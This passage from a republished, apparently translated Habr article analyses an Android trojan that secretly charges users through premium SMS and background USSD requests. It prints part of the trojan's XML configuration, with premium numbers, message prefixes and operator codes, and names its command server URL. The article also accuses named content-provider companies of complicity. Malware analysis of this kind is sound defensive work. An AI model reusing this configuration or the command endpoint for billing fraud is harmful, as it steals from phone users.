class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span>250<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span>http://mp3-999.com/content<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span>Online<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span>http://oxclick.com<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span>icon<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span>7204,7204,7212<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span>99933015599 041 122 6030,99933015599 041 122 6030,99933015599 041 122 6030<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span>25503<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span>http://mp3-999.com/content<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span>Online<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span>http://oxclick.com<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span>icon<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span>3303,3303,3303<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span>427242015599 041 122 6030,427242015599 041 122 6030,427242015599 041 122 6030<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span>400<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span>http://mp3-999.com/content<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span>Online<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span>http://oxclick.com<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span>icon<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span>7204,7204,7212<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span>99933015599 041 122 6030,99933015599 041 122 6030,99933015599 041 122 6030<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span>25501<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span>http://mp3-999.com/content<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span>Online<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span>http://oxclick.com<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span>icon<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span>7204,7204,7212<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span>99933015599 041 122 6030,99933015599 041 122 6030,99933015599 041 122 6030<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span>25505<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span>http://mp3-999.com/content<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span>Online<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span>http://oxclick.com<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span>icon<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span>3336<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">numr</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span>427242015599 041 122 6030<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">pref</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span>257<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">mccmnc</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">lock</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span>0<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">isBlocked</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span>http://mp3-999.com/content<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">url</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span>Online<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutName</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span>http://oxclick.com<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutUrl</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span>icon<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">shorcutIcon</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">number</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">oper</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br></div></div><br><br>  Another point is that <b>all USSD requests are running in the background</b> , that is, a trojan can check the user's balance for as long as it <b>needs</b> , he will not suspect anything.  Apparently, the implementation of the background execution of USSD requests was copied from the <a href="http://commandus.com/blog/%3Fp%3D58">commandus</a> site by the Trojan developers.  As a homework, readers are asked to understand why the implementation was copied from this site and find confirmation of this in the code. <br><br><h4>  Conclusion </h4><br>  I would like to say that the development of such applications is a direct violation of the law of the Russian Federation, namely, articles 159 and 273 of the Criminal Code of the Russian Federation.  Now the fraudsters can no longer otmazatsya, since the funds are not removed from the balance after pressing the abstract button, where the user assumes all responsibility for the consequences.  Here the balance can be devastated for years and the user may not suspect anything at all. <br><br>  Scammers, as well as content providers of numbers are by definition (because they provide direct assistance in making profits illegally or fraudulently) <b>8503, 7202, 7201, 7204, 7212, 3303, 3336</b> should be criminally punished.  By the way, specific providers for these numbers can be viewed, for example, on <a href="http://szf.megafon.ru/services/content/uslugi_operatora_s_kontent-prova/">the Megaphone</a> or <a href="">Beeline</a> <a href="http://szf.megafon.ru/services/content/uslugi_operatora_s_kontent-prova/">website</a> .  In order not to be unfounded, I cite the specific names of the content providers involved who own these numbers: <a href="http://www.incoremedia.ru/">InkorMedia LLC</a> , <a href="http://www.i-free.ru/">SMS services, LLC (Joke of the Day)</a> , <a href="http://investtelecom.ru/">Invest Telecom LLC</a> and so on. <br><br>  In addition, most likely, some data about the specific perpetrators can be extracted from the URL to which requests from the Trojan are sent, namely: <a href="http://mxclick.com/getTask.php" rel="nofollow"><b>mxclick.com/getTask.php</b></a> .  In general, interested readers can, if possible, try to find other traces of fraudsters themselves. <br><br>  Personally, I hope that the respected operators Megafon, Beeline, MTS, Tele2 and others will take serious measures about the content providers, because they have not followed the use of their numbers, and someone finally gets to the bottom of the real culprits who develop and distribute these Trojans and make them respond to the full extent of the law. </div><p>Source: <a href="https://habr.com/ru/post/161459/">https://habr.com/ru/post/161459/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../161449/index.html">Stubborn Maverick Huang Zhang and his Meizu smartphones</a></li>
<li><a href="../161451/index.html">NASA talked about the new rover and other Mars exploration plans</a></li>
<li><a href="../161453/index.html">Runetology (176): Sergey Zhitinsky, Director of Web Services Development Subscribe.ru</a></li>
<li><a href="../161455/index.html">Tricks of the developer under iOS. Splash screen</a></li>
<li><a href="../161457/index.html">Let's taste API v2 maps for Android from Google</a></li>
<li><a href="../161461/index.html">Installing SphinxSE on Percona Server</a></li>
<li><a href="../161463/index.html">Unity3d Getting started, practical advice. Review</a></li>
<li><a href="../161465/index.html">Google launches Knowledge Graph for Russian-speaking users</a></li>
<li><a href="../161467/index.html">Create a complex maze in the background of the web page</a></li>
<li><a href="../161469/index.html">PHP API in javascript. PHP.JS Overview</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>